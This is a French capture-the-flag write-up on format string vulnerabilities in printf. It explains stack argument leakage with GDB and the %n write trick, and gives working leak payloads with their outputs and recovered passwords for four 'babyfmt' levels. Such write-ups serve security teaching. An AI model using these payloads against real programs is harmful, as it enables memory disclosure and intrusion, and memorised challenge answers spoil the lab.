# Vidéos

Simple test pour vérifier où un printf() va chercher tous ses arguments : 

	printf("%d %d %d %d %d %d %d\n");

Puis avec GDB on inspecte les registres et la stack : 

	disass main
	b *main+115
	r
	info reg
	x/4gx $rsp

On voit que les premières valeurs sont stockées dans des registres mais que cela continue ensuite dans la stack.

Si on reste sur l'exemple de printf(), qui est la fonction la plus connue étant potentiellement vulnérable, on peut donc leaker de la donnée avec plusieurs formats :

- %c => Lire un caractère de la stack
- %d / %i / %x => Lire un nombre de la stack
- %x => Lire un nombre aussi mais en hexadécimal 
- %p => Lire un pointeur
- %s => Déréférencer un pointeur et lire des octets jusqu'à rencontrer un '\0'

Il y a également un alias `$` dans glibc qui permet de cibler directement un argument éloigné dans la stack sans avoir besoin d'afficher plein de %p avant. Par exemple pour afficher le 7ème argument il suffira d'un `%7$s` au lieu de `%p %p %p %p %p %p %s`

En plus de cette astuce avec `$` on peut aussi jouer avec le spécificateur %n qui sert à écrire dans l'argument correspondant le nombre de caractères déjà écrits par printf() jusqu'à ce point. Cela permet de réécrire des valeurs arbitraires dans des adresses données, c'est parfois assez compliqué mais quand même très puissant.

# Challenges

## babyfmt_level1.0

La consigne donne plusieurs informations utiles :

- Le mot de passe est une chaîne de 15 lettres majuscules
- Le mot de passe se trouve à l'adresse 0x7ffd9365ef40 et le pointeur de pile se trouve à l'adresse 0x7ffd9365ef10

La différence entre les adresses est de 0x30 soit 48 en décimal.
On est sur un système 64-bits donc on a un paquet de 8 octets par adresse.
Cela donne 48 / 8 = 6 positions de décalage entre le pointeur de pile et le mot de passe.

Payload à envoyer (car un %llx fait 8 octets donc cela couvre tout le mot de passe) :

```
%6$llx.%7$llx
```

Résultat renvoyé par le printf() qui suit :

```
4347505341464a55.46484c4d42514c
```

Conversion en little-endian puis en ASCII de ce résultat et on obtient le mot de passe, dont on a la longueur donnée en consigne pour aider.

## babyfmt_level1.1

Même principe que pour le premier challenge mais avec un payload généralisé parce que la consigne ne donne plus l'information d'où est situé le mot de passe : 

```
%1$llx.%2$llx.%3$llx.%4$llx.%5$llx.%6$llx.%7$llx.%8$llx.%9$llx.%10$llx.%11$llx.%12$llx.%13$llx.%14$llx.%15$llx.%16$llx.%17$llx.%18$llx.%19$llx.%20$llx.%21$llx.%22$llx.%23$llx.%24$llx.%25$llx.%26$llx.%27$llx.%28$llx.%29$llx.%30$llx
```

En faisant une traduction de tous les résultats différents de 0 on finit par trouver le mot de passe.

## babyfmt_level2.0

La consigne donne plusieurs informations utiles :

- Le mot de passe est une chaîne de 15 lettres majuscules
- Le mot de passe se trouve à l'adresse 0x7fff3981cbe0 et le pointeur de pile se trouve à l'adresse 0x7fff3981cb70
- On doit cette fois lire directement les octets eux-mêmes et non plus un pointeur

Il y a une différence de 14 positions entre ces adresses (112 / 8).

Payload qui a marché pour afficher une grosse partie de la pile en hexadécimal : 

```
%6$016lx%7$016lx%8$016lx%9$016lx%10$016lx%11$016lx%12$016lx%13$016lx%14$016lx%15$016lx%16$016lx%17$016lx%18$016lx%19$016lx%20$016lx%21$016lx%22$016lx%23$016lx%24$016lx%25$016lx
```

Résultat obtenu : 

```
00007ffcf351ae1000007ffcf351ac8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050464a48594e484a00414b55474c595100000000000000000000000000000000000000b10000000e0000000000000000
```

Conversion en little-endian puis en ASCII comme avant sur les deux groupes de caractères différents de 0 pour avoir les deux résultats à concaténer : 

	JHNYHJ FPQYLGUKA

## babyfmt_level2.1

Même procédure et même payload qu'avant car ce dernier est assez large pour couvrir une grosse partie de la stack.
